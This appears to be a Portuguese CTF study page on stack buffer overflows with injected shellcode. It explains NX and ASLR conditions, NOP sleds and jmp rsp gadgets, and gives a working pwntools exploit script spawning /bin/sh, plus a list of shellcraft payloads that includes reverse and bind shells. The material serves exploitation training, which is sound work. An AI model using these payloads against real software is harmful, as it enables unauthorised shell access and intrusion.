---
title: "Buffer Overflow - Shellcode"
sidebar_position: 3
---

Shellcode é código assembly. É pequeno. A ideia é colocar na stack, colocar o endereço do início do Shellcode no `return address` e mandar a RIP pra lá.

Pré-requisito: `pwn checksec` mostrando **NX disabled** (stack executável). Com NX, use [ROP](./rop.md).

1. Identifique se é possível fazer BOF
2. Descubra o endereço do buffer na stack (no GDB: `search AAAA` no pwndbg, ou `x/20gx $rsp`; ou o programa imprime). Com ASLR, a stack muda a cada execução: precisa de leak ou de ASLR desligado
3. Coloque o **Shellcode no Input** + **Padding até `return address`** + **Endereço do início do Shellcode na stack**
4. Sim, acabamos de mandar o `RIP` executar instrução na stack.

Margem de erro: coloque um *NOP sled* (`b'\x90' * 100`) antes do shellcode e aponte para o meio dele. Se o endereço do GDB diferir um pouco do real (variáveis de ambiente), o `RIP` ainda cai nos NOPs.

Se o buffer for pequeno: coloque o shellcode **depois** do `return address` e aponte o `return address` para um gadget `jmp rsp` (não precisa saber o endereço da stack).

Exemplo com pwntools, abrindo uma shell (`shellcraft.sh()`):

```py
from pwn import *

context.binary = ELF('./program')

p = process()

payload = asm(shellcraft.sh())          # Shellcode (gerado para a arquitetura do context.binary)
payload = payload.ljust(312, b'A')      # Padding até o return address
payload += p32(0xffffcfb4)              # Endereço do início do Shellcode (p64 em 64 bits)

log.info(p.clean())

p.sendline(payload)

p.interactive()
```

Se o input for lido com algo que para em certos bytes (`\n`, `\0`, espaço...): `encode(asm(shellcraft.sh()), avoid=b'\n\0 ')` gera uma versão sem esses bytes.

## ShellCode + pwntools

```py
# Shellcodes prontos populares
shellcraft.sh()           # /bin/sh
shellcraft.cat('file')    # cat file
shellcraft.dupsh()        # Duplica shell para fd
shellcraft.echo('text')   # Imprime texto
shellcraft.exit()         # Sai do processo
shellcraft.findpeersh()   # Encontra peer shell

# Redes
shellcraft.connect('ip', port)
shellcraft.bindsh(port)
shellcraft.reverse('ip', port)

# Arquivos
shellcraft.cat('/flag')              # Lê e imprime um arquivo (quando não dá para abrir shell)
shellcraft.open('/flag'), shellcraft.read(fd, buf, n), shellcraft.write(1, buf, n)
```

Lista completa: [Principais Funções Shellcraft](../../../extra/shellcraft.mdx).

Exemplo: 

```py
#!/usr/bin/env python3
from pwn import *

# Configurar
context.binary = ELF('./program')

p = process()

print("Gerando shellcode /bin/sh...")

# Gerar shellcode
shellcode = asm(shellcraft.sh())

print(f"Shellcode: {len(shellcode)} bytes")
print(hexdump(shellcode))

# Disassemblar para ver as instruções
print("\\nInstruções Assembly:")
print(disasm(shellcode))

# Testar (opcional - descomente para executar)
# print("\\n🚀 Executando shellcode...")
# p = run_shellcode(shellcode)
# p.interactive()
```
